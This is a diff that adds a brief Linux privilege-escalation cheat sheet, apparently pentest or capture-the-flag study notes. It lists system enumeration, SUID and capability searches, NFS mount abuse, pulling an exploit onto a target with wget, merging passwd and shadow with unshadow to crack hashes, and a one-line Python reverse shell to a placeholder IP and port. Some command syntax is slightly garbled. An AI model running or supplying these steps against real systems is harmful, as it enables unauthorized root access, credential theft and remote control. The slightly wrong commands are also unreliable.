@@ -1,0 +1,27 @@
+# Enumeration
+hostname : Ubuntu-3487340239
+uname -a : kernel used by the system <CVE>
+/proc/version : 
+/etc/issue : This file usually contains some information about the operating system but can easily be customized or changed.
+env : show environmental variables.
+sudo -l : command can be used to list all commands your user can run using sudo.
+/etc/passwd : file can be an easy way to discover users on the system. 
+
+# SUID or SGID
+find / -type f -perm -04000 -ls 2>/dev/null
+find / -perm (-u=s or -4000) -type f 2>/dev/null: Find files with the SUID bit
+
+# transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
+python3 -m http.server 8080 and wget http://ip:8080/exploit
+
+# The unshadow tool’s usage can be seen below;
+unshadow passwd.txt shadow.txt > passwords.txt
+
+# the getcap tool to list enabled capabilities.
+getcap -r / : tool = cap_setuid+eq
+
+# /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+showmount -o IP and mount -o rw IP:/dir /path/
+
+# py reverse-shell
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
